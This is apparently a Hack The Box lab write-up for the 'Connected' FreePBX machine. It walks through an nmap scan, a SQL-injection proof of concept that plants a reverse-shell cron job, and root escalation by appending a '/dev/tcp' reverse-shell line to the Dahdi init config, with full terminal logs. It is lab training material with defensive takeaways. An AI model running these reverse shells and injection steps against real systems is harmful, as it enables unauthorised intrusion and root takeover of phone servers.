---
title: Connected
description: Connected Hack The Box writeup covering the web foothold and Dahdi restart privilege escalation.
---

# Connected

<img class="htb-banner" src="images/banner.png" alt="Connected box banner placeholder">

!!! note "Replaceable banner"
    Replace `images/banner.png` in this box folder with the final Connected artwork. The page already points to that filename.

| Field | Value |
| --- | --- |
| Status | Completed — June 8, 2026 |
| Difficulty | Easy; assessed as Medium by the author |
| Focus | Linux, web exploitation |
| Machine | [Connected on Hack The Box](https://app.hackthebox.com/machines/Connected?sort_by=created_at&sort_type=desc) |

## Attack path

1. Scan the host and identify HTTP, HTTPS and SSH.
2. Enumerate the web application and confirm the vulnerable management interface.
3. Use the supplied SQL-injection proof of concept to insert a one-shot reverse-shell cron job.
4. Land as the `asterisk` user on the FreePBX host.
5. Abuse the Dahdi restart workflow to execute a root-owned reverse shell.

## 1. Reconnaissance

The full scan found three exposed TCP services:

```bash
nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap_full_scan LAB_IP
```

| Port | Service | Note |
| ---: | --- | --- |
| 22/tcp | SSH | Remote access after obtaining a valid account. |
| 80/tcp | HTTP | Web management surface. |
| 443/tcp | HTTPS | The TLS variant of the same exposed service family. |

The two supplied reconnaissance screenshots are kept in sequence below.

<figure class="htb-figure">
  <img class="htb-screenshot" src="images/image-1.png" alt="Connected web reconnaissance screenshot one" loading="lazy">
  <figcaption><strong>Figure 1.</strong> Initial web reconnaissance against the Connected host.</figcaption>
</figure>

<figure class="htb-figure">
  <img class="htb-screenshot" src="images/image-2.png" alt="Connected web reconnaissance screenshot two" loading="lazy">
  <figcaption><strong>Figure 2.</strong> The second reconnaissance view from the completed lab session.</figcaption>
</figure>

## 2. Obtain a shell through the web application

The source notes use a proof of concept for the SQL-injection issue. The important behavior is that the exploit inserts a temporary cron job that connects back to the operator, waits for the callback, and removes the job to avoid repeated connections.

```bash
python3 exploit.py http://connected.htb --ip CALLBACK_IP
```

A successful run reports the database version, creates the cron job and returns an interactive shell:

```text
[+] Vulnerable! DB version: 5.5.65-MariaDB
[*] Injecting reverse-shell cron job ...
[+] Cron job 'jkbthmng' inserted (runs every minute).
[*] Waiting for callback (up to ~70s) ...
[+] Shell from LAB_IP:CALLBACK_PORT !
[+] Removed cron job 'jkbthmng' (no repeat callbacks).
```

Stabilize the callback before continuing:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The shell lands in the FreePBX environment as `asterisk`. From there, confirm the user flag location:

```bash
[asterisk@connected ~]$ ls
user.txt

[asterisk@connected ~]$ cat user.txt
<USER_FLAG_REDACTED>
```

## 3. Privilege escalation through the Dahdi restart path

The completed solution appends a command to the Dahdi initialization configuration and creates the restart marker consumed by the management workflow. Use an operator-controlled listener before triggering the restart:

```bash
# On the operator machine
nc -lvnp 9001
```

```bash
# From the asterisk shell
printf '%s\n' 'bash -c "bash -i >& /dev/tcp/CALLBACK_IP/9001 0>&1" &' \
  >> /etc/dahdi/init.conf

echo 'restart' > /var/spool/asterisk/sysadmin/dahdi_restart
```

When the Dahdi restart handler processes the marker, the callback arrives with root privileges. Verify the context before reading the root flag:

```bash
[root@connected /]# whoami
root

[root@connected /]# cat /root/root.txt
<ROOT_FLAG_REDACTED>
```

## Takeaways

- A web-facing SQL injection can become a reliable foothold when it reaches a scheduled execution path.
- Remove temporary cron jobs after a callback to prevent repeated shells.
- Management scripts that process restart markers must validate both the caller and the requested action.
- A privileged service must not consume attacker-controlled configuration or restart files without strict ownership and content checks.
## Complete source command blocks

The following blocks preserve the complete typed commands and terminal output from the supplied source note. Output is kept intact except for user and root flag values, which are represented by the redaction markers used above.

### Source block 1 (`jsx`)

```jsx
                                                                                                                                                                                       
┌──(kali㉿kali)-[~/nmap]
└─$ nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap_full_scan 10.129.238.138
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-07 23:57 -0400
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.68% done; ETC: 23:59 (0:01:57 remaining)
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Stats: 0:02:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.52% done; ETC: 23:59 (0:00:01 remaining)
Stats: 0:02:30 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.55% done; ETC: 23:59 (0:00:00 remaining)
Nmap scan report for connected.htb (10.129.238.138)
Host is up (1.1s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE    VERSION
22/tcp  open  tcpwrapped
80/tcp  open  tcpwrapped
443/tcp open  tcpwrapped

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.33 seconds

```

### Source block 2 (`jsx`)

```jsx
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/CVEs/CVE-2025-57819-poc]
└─$ python3 exploit.py http://connected.htb --ip 10.10.16.6
[*] Listener address: 10.10.16.6:4444 (iface tun0)
[*] Confirming SQLi on http://connected.htb ...
[+] Vulnerable! DB version: 5.5.65-MariaDB
[*] Listening on 0.0.0.0:4444
[*] Injecting reverse-shell cron job ...
[+] Cron job 'jkbthmng' inserted (runs every minute).
[*] Waiting for callback (up to ~70s) ...
[+] Shell from 10.129.238.138:49706 !
[+] Removed cron job 'jkbthmng' (no repeat callbacks).
--- interactive shell (Ctrl-C to quit) ---
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /                                                                                                                                               
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V /                                                                                                                                                
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \                                                                                                                                                
| |    | |   |  __/|  __/| |    | |_/ // /^\ \                                                                                                                                               
\_|    |_|    \___| \___|\_|    \____/ \/   \/                                                                                                                                               
                                                                                                                                                                                             
                                                                                                                                                                                             
NOTICE! You have 3 notifications! Please log into the UI to see them!                                                                                                                        
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | 00:50:56:95:7E:FF | 10.129.238.138            |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

< 'import pty;pty.spawn("/bin/bash")' 2>/dev/null || /bin/bash -i            
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /                                                                                                                                               
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V /                                                                                                                                                
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \                                                                                                                                                
| |    | |   |  __/|  __/| |    | |_/ // /^\ \                                                                                                                                               
\_|    |_|    \___| \___|\_|    \____/ \/   \/                                                                                                                                               
                                                                                                                                                                                             
                                                                                                                                                                                             
NOTICE! You have 3 notifications! Please log into the UI to see them!                                                                                                                        
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | 00:50:56:95:7E:FF | 10.129.238.138            |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[asterisk@connected ~]$ ls 
s
bash: s: command not found
[asterisk@connected ~]$ ls
ls
user.txt
[asterisk@connected ~]$cat user.txt
cat user.txt
<USER_FLAG_REDACTED>

```

### Source block 3 (`bash`)

```bash
[asterisk@connected asterisk]$ echo 'bash -c "bash -i >& /dev/tcp/10.10.16.28/9001 0>&1" &' >> /etc/dahdi/init.conf   
01 0>&1" &' >> /etc/dahdi/init.conf10.10.16.28/90 
[asterisk@connected asterisk]$ echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
di_restartart" > /var/spool/asterisk/sysadmin/dah 
[asterisk@connected asterisk]$ 

┌──(kali㉿kali)-[~/CVEs/CVE-2025-57819-poc]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.28] from (UNKNOWN) [10.129.106.66] 33612
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | 00:50:56:95:68:76 | 10.129.106.66             |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[root@connected /]# whoami
whoami
root
[root@connected /]# cat /root/root.txt 
cat /root/root.txt
<ROOT_FLAG_REDACTED>

```
